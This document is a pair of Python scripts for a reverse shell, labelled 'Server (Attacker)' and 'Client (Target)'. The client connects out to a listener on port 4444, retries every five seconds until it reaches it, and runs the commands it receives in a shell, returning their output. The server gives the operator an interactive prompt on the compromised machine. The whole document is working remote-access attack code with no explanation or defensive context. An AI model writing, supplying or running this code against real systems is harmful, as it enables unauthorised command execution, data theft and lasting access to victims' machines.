# Server (Attacker) Script - server.py

import socket
import sys

def start_server(host='0.0.0.0', port=4444):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((host, port))
    server.listen(5)
    print(f"[+] Server started on {host}:{port}")
    print("[+] Waiting for connection...")
    
    # Accept connection
    conn, addr = server.accept()
    print(f"[+] Connection from {addr[0]}:{addr[1]}")
    
    # Get initial working directory
    conn.send("pwd".encode())
    cwd = conn.recv(4096).decode()
    
    # Command loop
    while True:
        try:
            # Show prompt with current directory
            cmd = input(f"{addr[0]}:{cwd}> ")
            
            if cmd.lower() == "exit":
                conn.send("exit".encode())
                break
            
            if not cmd.strip():
                continue
                
            # Send command to client
            conn.send(cmd.encode())
            
            # Get response
            response = conn.recv(4096).decode()
            
            # Update working directory if needed
            if cmd.startswith("cd "):
                cwd = response
                
            print(response)
            
        except KeyboardInterrupt:
            print("\n[!] Exiting...")
            conn.send("exit".encode())
            break
    
    conn.close()
    server.close()

if __name__ == "__main__":
    try:
        port = int(sys.argv[1]) if len(sys.argv) > 1 else 4444
        start_server(port=port)
    except KeyboardInterrupt:
        print("\n[!] Server terminated")


# Client (Target) Script - client.py

import socket
import os
import subprocess
import sys
import time

def connect_to_server(host, port=4444):
    while True:
        try:
            # Create socket and connect
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((host, port))
            
            # Command handling loop
            while True:
                # Wait for command
                cmd = client.recv(4096).decode()
                
                # Exit command
                if cmd == "exit":
                    break
                
                # Get current directory
                elif cmd == "pwd":
                    result = os.getcwd()
                
                # Change directory
                elif cmd.startswith("cd "):
                    directory = cmd[3:]
                    try:
                        os.chdir(directory)
                        result = os.getcwd()
                    except Exception as e:
                        result = f"Error: {str(e)}"
                
                # List directory contents
                elif cmd == "ls" or cmd == "dir":
                    try:
                        files = os.listdir(os.getcwd())
                        result = "\n".join(files)
                    except Exception as e:
                        result = f"Error: {str(e)}"
                
                # Execute shell command
                else:
                    try:
                        process = subprocess.Popen(
                            cmd,
                            shell=True,
                            stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE
                        )
                        stdout, stderr = process.communicate()
                        
                        if stdout:
                            result = stdout.decode()
                        elif stderr:
                            result = stderr.decode()
                        else:
                            result = "Command executed (no output)"
                    except Exception as e:
                        result = f"Error: {str(e)}"
                
                # Send result back to server
                client.send(result.encode())
            
            client.close()
            break
            
        except Exception:
            # If connection fails, wait and retry
            time.sleep(5)

if __name__ == "__main__":
    server_host = sys.argv[1] if len(sys.argv) > 1 else "localhost"
    server_port = int(sys.argv[2]) if len(sys.argv) > 2 else 4444
    connect_to_server(server_host, server_port)